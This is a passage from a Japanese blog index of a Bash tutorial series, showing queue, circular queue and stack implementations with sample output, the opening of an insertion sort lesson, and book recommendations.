\u0026#34;$ID\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;queueDisplay() # 表示 function queueDisplay(){ for((i=front;i\u0026lt;rear;i++));do echo \u0026#34;$i\u0026#34; \u0026#34;$(aRray[$i].getValue)\u0026#34;; done echo \u0026#34;------\u0026#34;; } ## # \u0026lt;\u0026gt;dequeue() # デキュー function dequeue(){ ((front++)); } ## # \u0026lt;\u0026gt;enqueue() # エンキュー function enqueue(){ ID=$1; value=$2; setID \u0026#34;$rear\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$rear\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット ((rear++)); } ## # \u0026lt;\u0026gt;peek() # ピーク function peek(){ echo \u0026#34;peek :\u0026#34;$front : $(aRray[$front].getValue); } ## # \u0026lt;\u0026gt;execQueue() # キューの実行 function execQueue(){ rear=0; #後ろ端（enqueueされるほう） front=0; #前端（peek/dequeueされるほう) ID=100; enqueue $((ID++)) 10; enqueue $((ID++)) 20; enqueue $((ID++)) 30; enqueue $((ID++)) 40; echo \u0026#34;データを4つenqueue\u0026#34;; peek; queueDisplay; #---- dequeue; dequeue; echo \u0026#34;データを2つdequeue\u0026#34;; peek; queueDisplay; #---- enqueue $((ID++)) 50; echo \u0026#34;データを1つenqueue\u0026#34;; peek; queueDisplay; #---- } ## # メイン execQueue; exit; 実行結果 bash-5.1$ bash 03_2Eval_Queue.sh データを4つenqueue peek :0 : 10 0 10 1 20 2 30 3 40 ------ データを2つdequeue peek :2 : 30 2 30 3 40 ------ データを1つenqueue peek :2 : 30 2 30 3 40 4 50 ------ bash-5.1$ 循環キュー 映画館の待ち行列なら、先頭の一人が列を去ったら、列全体が前に進みます。\nキューでは削除のたびに全ての項目を前に詰めて移動しますが、その時間が無駄です。\nむしろ項目はそのままにしておいて、キューのフロント(前端)やリア（後端）が動いた方が簡単なのです。\nしかしその場合の問題は、キューの後端がすぐに配列の終端に達してしまいます。\nまだ満杯ではないのに新たなデータを挿入できないというこの問題を解決するために、循環キューでは、frontとrearの矢印は配列の先頭へラップアラウンド（最初に戻る）します。\nその結果として循環キューというものができあがります。リングバッファとも呼ばれます。\nキューと循環キューの本質的な違いは、キューは循環キューよりも多くのスペースを消費するのに対し、循環キューはキューのメモリ浪費を制限するように考案されたということです。\nキュー Bash/シェルスクリプトの配列で実装したキュー ## # function display(){ for((n=0;n\u0026lt;nElems;n++));do echo \u0026#34;$n\u0026#34; \u0026#34;${array[n]}\u0026#34;; done echo \u0026#34;------\u0026#34;; } ## # function insert(){ array[nElems++]=\u0026#34;$1\u0026#34;; } ## # function setArray(){ nElems=0; for((i=0;i\u0026lt;$1;i++));do insert $(echo \u0026#34;$RANDOM\u0026#34;); done } ## # function CircularQDisplay(){ for((i=0;i\u0026lt;maxSize;i++));do echo \u0026#34;$i\u0026#34; \u0026#34;${queue[i]}\u0026#34;; done echo \u0026#34;------\u0026#34;; } ## # function CircularQDequeue(){ ((front++)); ((front==maxSize))\u0026amp;\u0026amp;{ front=0; } } ## # function CircularQEnqueue(){ (( rear==(maxSize-1) ))\u0026amp;\u0026amp;{ rear=-1; } queue[++rear]=$1; } ## # function CircularQPeek(){ echo \u0026#34;peek :front :$front rear : $rear peek : $front ${queue[front]} \u0026#34;; } ## # function execCircularQ(){ rear=-1; #後ろ端（enqueueされるほう） front=0; #前端（peek/dequeueされるほう) maxSize=5 #キューの項目数 CircularQEnqueue 10; CircularQEnqueue 20; CircularQEnqueue 30; CircularQEnqueue 40; echo \u0026#34;データを4つenqueue\u0026#34;; CircularQPeek; CircularQDisplay; #exit; #---- CircularQDequeue; CircularQDequeue; echo \u0026#34;データを2つdequeue\u0026#34;; CircularQPeek; CircularQDisplay; #exit; #---- CircularQEnqueue 50; echo \u0026#34;データを1つenqueue\u0026#34;; CircularQPeek; CircularQDisplay; #exit; #---- # CircularQ CircularQEnqueue 60; CircularQEnqueue 70; echo \u0026#34;データを2つenqueue\u0026#34;; CircularQPeek; CircularQDisplay; #exit; #--- CircularQDequeue; CircularQDequeue; CircularQDequeue; echo \u0026#34;データを3つdequeue\u0026#34;; CircularQPeek; CircularQDisplay; } ## # execCircularQ; exit; bash/シェルスクリプトによる疑似２次元配列の実装 ####################################### # 03_3CircularQueue.shを、少しだけオブジェクティブに # aRray[0].getValue() で値を取得できるように改変した # 配列にIDと値を入れるだけのbashスクリプト ####################################### ## # グローバル変数 declare -i nElems=0; declare -i rear=0; # # \u0026lt;\u0026gt;display() # 配列を表示 function display(){ for((i=0;i\u0026lt;nElems;i++)){ echo -n \u0026#34;aRray[$i] \\ ID: \u0026#34; $( aRray[$i].getID ) \u0026#34; \\ Value:\u0026#34; $( aRray[$i].getValue ) ; echo \u0026#34;\u0026#34;; } } ## # \u0026lt;\u0026gt;setValue() # セッター function setValue() { #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getValue() { echo \u0026#34;$value\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setID() # セッター function setID(){ #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local ID=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getID() { echo \u0026#34;$ID\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt; insert # 配列の要素に値を代入 function insert(){ local ID=$1; #100からの連番 local value=$2; #配列に代入される要素の値 setID \u0026#34;$nElems\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$nElems\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット ((nElems++)); } ## # \u0026lt;\u0026gt; set Array # 配列を作成 function setArray(){ local N=$1; #すべての要素数 local ID=100; #100からの連番 local value; #配列に代入される要素の値 for((i=0;i\u0026lt;N;i++)){ value=$( echo $RANDOM ); insert $((ID++)) $value; } } # \u0026lt;\u0026gt; init Array # 配列を作成 function initArray(){ local N=$1; #すべての要素数 local ID=100; #100からの連番 local value=null; #配列に代入される要素の値 for((i=0;i\u0026lt;N;i++)){ insert $((ID++)) $value; } } ## function CircularQDisplay(){ for((i=0;i\u0026lt;maxSize;i++));do echo \u0026#34;$i\u0026#34; $(aRray[$i].getValue); done echo \u0026#34;------\u0026#34;; } ## # function CircularQDequeue(){ ((front++)); ((front==maxSize))\u0026amp;\u0026amp;{ front=0; } } ## # function CircularQEnqueue(){ ID=$1; value=$2; if(( rear==(maxSize-1) ));then rear=-1; fi ((rear++)); setID \u0026#34;$rear\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$rear\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット } ## # function CircularQPeek(){ echo \u0026#34;peek :front :$front rear : $rear peek : $front $(aRray[$front].getValue) \u0026#34;; } ## # function execCircularQ(){ rear=-1; #後ろ端（enqueueされるほう） front=0; #前端（peek/dequeueされるほう) ID=100; maxSize=5 #キューの項目数 initArray $maxSize; CircularQEnqueue $((ID++)) 10; CircularQEnqueue $((ID++)) 20; CircularQEnqueue $((ID++)) 30; CircularQEnqueue $((ID++)) 40; echo \u0026#34;データを4つenqueue\u0026#34;; CircularQPeek; CircularQDisplay; #---- CircularQDequeue; CircularQDequeue; echo \u0026#34;データを2つdequeue\u0026#34;; CircularQPeek; CircularQDisplay; #---- CircularQEnqueue $((ID++)) 50; echo \u0026#34;データを1つenqueue\u0026#34;; CircularQPeek; CircularQDisplay; #---- # CircularQ CircularQEnqueue $((ID++)) 60; CircularQEnqueue $((ID++)) 70; echo \u0026#34;データを2つenqueue\u0026#34;; CircularQPeek; CircularQDisplay; #--- CircularQDequeue; CircularQDequeue; CircularQDequeue; echo \u0026#34;データを3つdequeue\u0026#34;; CircularQPeek; CircularQDisplay; } ## # # 実行 execCircularQ; exit; 実行結果 データを4つenqueue peek :front :0 rear : 3 peek : 0 10 0 10 1 20 2 30 3 40 4 null ------ データを2つdequeue peek :front :2 rear : 3 peek : 2 30 0 10 1 20 2 30 3 40 4 null ------ データを1つenqueue peek :front :2 rear : 4 peek : 2 30 0 10 1 20 2 30 3 40 4 50 ------ データを2つenqueue peek :front :2 rear : 1 peek : 2 30 0 60 1 70 2 30 3 40 4 50 ------ データを3つdequeue peek :front :0 rear : 1 peek : 0 60 0 60 1 70 2 30 3 40 4 50 ------ 「ざっくり」シリーズのご紹介 【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-06T13:43:07+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/","title":"【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４"},{"content":"スタック スタックはデータ構造の一つです。\nスタックの仕組みは、ものを縦に積み上げる事を考えるとイメージしやすいです。\n積み上げられた山からものを取り出す場合、上から順番に取り出す事になります。\n自分の机の上の郵便が、古いものが下、新しい郵便は上に重ねて置かれ、封筒を開けるのは上の郵便から開ける仕草に似ています。\nスタックにデータを追加する場合、データは一番最後に追加されます。\nスタックにデータを追加する操作をpushと呼びます。\nスタックからデータを取り出す場合、最も新しく追加されたデータから取り出されます。\nスタックからデータを取り出す操作をpopと呼びます。\nこのような、後から入れたものを先に出す「後入れ先出し」の仕組みを「Last In First Out 」を略してLIFOと呼びます。\nスタック プログラムソース この章で使っているプログラムソースは以下にあります。\n03_1Stack.sh 一般的な配列のスタック\n03_2Eval_Stack.sh 擬似的な２次元配列で実装したスタック\nスタックの処理アルゴリズム では実行処理を書きます。\nexecStack という実行関数にして、配列を１０用意することにします。\n## # 実行 execStack 10; exit; では、execStack()関数を書きます。\nexecStack()関数の中身として、１０個の配列にランダムな値を一つ一つ代入して配列を完成させる処理。\nその後、スタックのPOPポップ、PUSHプッシュ、そして今の段階の配列の状態を確認するdisplay()関数の呼び出しを一連で書き連ねたstack()関数の呼び出しを書きます。\n## # \u0026lt;\u0026gt;execStack() # スタックの実行 function execStack(){ setArray \u0026#34;$1\u0026#34;; stack; } ## # 実行 execStack 10; exit; では setArray() を見ていきます。\nexecStack()で呼び出しているのは、\nset Array \u0026#34;$1\u0026#34;; ですが、\u0026quot;$1\u0026quot;というのは、\nexecStack 10; の、１０です。\nsetArray()では、受け取った１０が入った変数は$1として受け取ります。forループの条件式の中で$1が見えますね。\nこのsetArray()は、これまでの配列、バブルソート、選択ソート、挿入ソートでもでてきた同じものです。\ninset()されるたびに、peekがインクリメントして、新しい要素にランダムに生成された値を代入します。\n## # \u0026lt;\u0026gt;insert() # 配列に値を挿入 function insert(){ array[$((peek++))]=\u0026#34;$1\u0026#34;; } ## # \u0026lt;\u0026gt;setArray() # 配列にランダムな値を要素として挿入 function setArray(){ peek=0; for((i=0;i\u0026lt;$1;i++));do insert $(echo \u0026#34;$RANDOM\u0026#34;); done } 次にstack()関数を見ていきます。\nstack()関数を追記したソースは以下のとおりです。\n上から順番に、display で、まずは入れ全体の状態を見ます。\n次に stackPop で、配列から一つPOP(抜き出す）します。\n次に stackPush で、配列の末尾にランダムな値を一つ追加します。\n## # \u0026lt;\u0026gt;stack() # スタック（表示とポップとプッシュ）の実行 function stack(){ display; #表示 stackPop; stackPush; stackPush; display; #表示 stackPop; stackPop; stackPop; stackPop; display; #表示 stackPop; stackPop; stackPop; display; #表示 stackPop; stackPop; stackPop; display; #表示 stackPop; stackPop; # Empty } ## # \u0026lt;\u0026gt;execStack() # スタックの実行 function execStack(){ setArray \u0026#34;$1\u0026#34;; stack; } ## # 実行 execStack 10; exit; さて、スタックを知るために必要なのは以下の３つの関数です。\nプッシュ、ポップはイメージでわかると思います。\n図を見ていただければ直感的に理解できると思います。\nピークというのは、これも図のpeekを見てもらうとわかりやすいです。これまでのアルゴリズムの中でnElemsという変数で使われていたものが、スタックの中ではpeekと名前を変えています（アルゴリズムの世界でそうされています）\nstackPeek()という関数は、プッシュ、ポップをするたびに呼び出される関数で、今何をプッシュしたか、今何をポップしたかを表示する関数です。\nプッシュ、ポップするたびに、peekは上がったり下がったりします。\nスタック ## # \u0026lt;\u0026gt;stackPeek() # ピーク function stackPeek(){ echo \u0026#34;$1 : $peek:\u0026#34;${array[$peek]}\u0026#34;\u0026#34;; } ## # \u0026lt;\u0026gt;stackPush() # プッシュ function stackPush(){ array[$((peek))]=$(echo \u0026#34;$RANDOM\u0026#34;); stackPeek \u0026#34;push\u0026#34;; ((peek++)); } ## # \u0026lt;\u0026gt;stackPop() # ポップ function stackPop(){ if (($peek!=0));then ((peek--)); stackPeek \u0026#34;pop\u0026#34;; else echo \u0026#34;Stack is empty\u0026#34;; fi } bash/シェルスクリプトによる疑似２次元配列の実装 ####################################### # 03_1Stack.shを、少しだけオブジェクティブに # aRray[0].getValue() で値を取得できるように改変した # 配列にIDと値を入れるだけのbashスクリプト ####################################### ## # グローバル変数 declare -i nElems=0; # # \u0026lt;\u0026gt;display() # 配列を表示 function display(){ for((i=0;i\u0026lt;nElems;i++)){ echo -n \u0026#34;aRray[$i] \\ ID: \u0026#34; $( aRray[$i].getID ) \u0026#34; \\ Value:\u0026#34; $( aRray[$i].getValue ) ; echo \u0026#34;\u0026#34;; } } ## # \u0026lt;\u0026gt;setValue() # セッター function setValue() { #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getValue() { echo \u0026#34;$value\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setID() # セッター function setID(){ #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local ID=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getID() { echo \u0026#34;$ID\u0026#34;; }\u0026#34; } ## # stackPeek() # ピーク function stackPeek(){ echo \u0026#34;$1 : $((nElems-1)):$(aRray[$((nElems-1))].getValue)\u0026#34;; } ## # stackPush() # プッシュ function stackPush(){ local value=$( echo $RANDOM ); local ID=$(aRray[$((nElems-1))].getID) insert $((ID++)) $value; stackPeek \u0026#34;push\u0026#34;; } ## # \u0026lt;\u0026gt;stackPop() # ポップ function stackPop(){ if(($nElems!=0));then stackPeek \u0026#34;pop\u0026#34;; ((nElems--)); else echo \u0026#34;Stack is empty\u0026#34;; fi } ## # \u0026lt;\u0026gt;stack() # スタックの処理を明示的に手続き型で書いています。 function stack(){ display; stackPop; stackPush; stackPush; display; stackPop; stackPop; stackPop; stackPop; display; stackPop; stackPop; stackPop; display; stackPop; stackPop; stackPop; display; stackPop; stackPop;# Empty } ## # \u0026lt;\u0026gt; insert # 配列の要素に値を代入 function insert(){ local ID=$1; #100からの連番 local value=$2; #配列に代入される要素の値 setID \u0026#34;$nElems\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$nElems\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット ((nElems++)); } ## # \u0026lt;\u0026gt; set Array # 配列を作成 function setArray(){ local N=$1; #すべての要素数 local ID=100; #100からの連番 local value; #配列に代入される要素の値 for((i=0;i\u0026lt;N;i++)){ value=$( echo $RANDOM ); insert $((ID++)) $value; } } ## # # メインルーチン function execStack(){ local N=$1; #配列をセット setArray \u0026#34;$N\u0026#34;; stack; } ## # 実行 execStack 10; exit; 実行結果 aRray[0] ID: 100 Value: 27417 aRray[1] ID: 101 Value: 2106 aRray[2] ID: 102 Value: 12360 aRray[3] ID: 103 Value: 10391 aRray[4] ID: 104 Value: 20982 aRray[5] ID: 105 Value: 4280 aRray[6] ID: 106 Value: 8584 aRray[7] ID: 107 Value: 30998 aRray[8] ID: 108 Value: 363 aRray[9] ID: 109 Value: 29461 pop : 9:29461 push : 9:30571 push : 10:9219 aRray[0] ID: 100 Value: 27417 aRray[1] ID: 101 Value: 2106 aRray[2] ID: 102 Value: 12360 aRray[3] ID: 103 Value: 10391 aRray[4] ID: 104 Value: 20982 aRray[5] ID: 105 Value: 4280 aRray[6] ID: 106 Value: 8584 aRray[7] ID: 107 Value: 30998 aRray[8] ID: 108 Value: 363 aRray[9] ID: 108 Value: 30571 aRray[10] ID: 108 Value: 9219 pop : 10:9219 pop : 9:30571 pop : 8:363 pop : 7:30998 aRray[0] ID: 100 Value: 27417 aRray[1] ID: 101 Value: 2106 aRray[2] ID: 102 Value: 12360 aRray[3] ID: 103 Value: 10391 aRray[4] ID: 104 Value: 20982 aRray[5] ID: 105 Value: 4280 aRray[6] ID: 106 Value: 8584 pop : 6:8584 pop : 5:4280 pop : 4:20982 aRray[0] ID: 100 Value: 27417 aRray[1] ID: 101 Value: 2106 aRray[2] ID: 102 Value: 12360 aRray[3] ID: 103 Value: 10391 pop : 3:10391 pop : 2:12360 pop : 1:2106 aRray[0] ID: 100 Value: 27417 pop : 0:27417 Stack is empty 「ざっくり」シリーズのご紹介 【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-06T11:47:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/","title":"【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３"},{"content":"挿入ソート 挿入ソートとは、未整列の要素を一つずつつまみ上げて、整列済みの列の適切な位置に挿入していくアルゴリズムです。\n挿入ソートは、選択ソートと異なり、整列したいデータ列以外の一時記憶領域を用意しなくて良いという特徴があります。\n対象データ列が短い場合などに効果的に利用されます。\n人間に並べ替えを行わせるとまっさきに思いつく方法として親しまれていたりもします。\nがんばれ挿入ソート！\n挿入ソート プログラムソース この章で使っているプログラムソースは以下にあります。\n02_3InsertionSort.sh 一般的な配列の挿入ソート\n02_3Eval_InsertionSort.sh 擬似的な２次元配列で実装した挿入ソート\n挿入ソートの処理手順 １．配列の先頭から小さい順に並べる。\n２．先頭から2つの値を比較して小さい方を１番目に、大きい方を２番目に置く。\n３．３番目の値を取り出し、１番め、２番目と順に比較し、適切な位置（左から小さい順に並ぶよう）に挿入する。\n４．４番目以降も同様に、n番目の値を取り出して先頭からn-1番目まで順番に比較し、適切な位置に挿入します。\n５．上記の操作を末尾の値まで繰り返すことで、先頭が最も小さく末尾が最も大きい数値の列が得られる。\nn番目の値を挿入する際、\nｎ番目の値が整列済みの列の中で最も小さければ、先頭の値との1回の比較で挿入位置が決定できます。 ところが、\nｎ番目の値が整列済みの列の中で最も大きければ、整列済みの値の数（n-1回）だけ比較を繰り返さなければなりません（ここが挿入ソートの最大の弱点） がんばれ挿入ソート！\n挿入ソート２ 挿入ソートのアルゴリズム 配列の要素が整列済みに近い状態ならば高速に整列を完了できる（最良計算時間はO(N)）\n逆順に並んでいる場合はとてつもない回数の比較が必要（最悪計算時間はO(N^2)）となってしまう。\nこの欠点をある程度緩和したアルゴリズムとしてシェルソート（Shell sort）がある。\n選択ソートのように一時的な要素の値を保管する領域を確保する必要はないことが挿入ソートのメリット。\n選択ソートはヒープソートを学ぶための一里塚と言われているが、同様に挿入ソートは、シェルソートを学ぶための一里塚との位置づけとも言われている。\nBash/シェルスクリプトで実装した一般的な配列で実装した挿入ソート。\n## # 